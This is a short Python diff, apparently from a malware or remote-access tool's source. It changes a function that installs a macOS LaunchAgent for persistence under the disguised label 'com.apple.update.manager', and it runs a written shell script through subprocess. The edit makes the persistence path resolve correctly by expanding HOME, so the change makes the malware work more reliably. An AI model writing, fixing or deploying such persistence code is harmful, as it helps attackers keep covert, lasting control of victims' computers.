@@ -168,7 +168,8 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                     fileobj.write(bash)
                 bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 time.sleep(1)
-                launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
+                home = os.environ.get('HOME')
+                launch_agent= '{}/Library/LaunchAgents/{}.plist'.format(home, label)
                 if os.path.isfile(launch_agent):
                     os.remove(fpath)
                     return (True, launch_agent)
